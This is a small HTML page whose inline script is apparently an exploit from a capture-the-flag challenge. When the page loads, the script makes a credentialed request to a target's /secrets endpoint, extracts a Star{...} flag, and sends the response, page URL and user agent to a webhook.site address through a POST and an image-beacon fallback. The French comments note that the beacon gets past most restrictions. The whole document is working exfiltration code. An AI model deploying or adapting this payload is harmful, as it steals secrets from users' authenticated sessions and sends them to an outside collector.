<!doctype html><meta charset="utf-8"><title>probe</title>
<script>
(async () => {
  const WH = "https://webhook.site/b0f84846-9eb0-4c6a-bf28-76c2ffc630d9";
  const tag = "takedown-selftest-" + Math.random().toString(16).slice(2);
  try {
    const r = await fetch("https://api.takedown.cyxo.re/secrets", { credentials:"include" });
    const t = await r.text();
    const body = JSON.stringify({
      when: new Date().toISOString(),
      from: location.href,
      ua: navigator.userAgent,
      status: r.status,
      text: t,
      flag: (t.match(/Star\{[^}]+\}/) || [null])[0],
      tag
    });
    // canal 1 : POST (si autorisÃ©)
    fetch(WH, { method:"POST", mode:"no-cors", body }).catch(()=>{});
    // canal 2 : GET-beacon (passe quasi partout)
    new Image().src = WH + "?d=" + encodeURIComponent(body);
  } catch(e) {
    new Image().src = WH + "?d=" + encodeURIComponent(JSON.stringify({err:String(e), from:location.href, tag}));
  }
})();
</script>
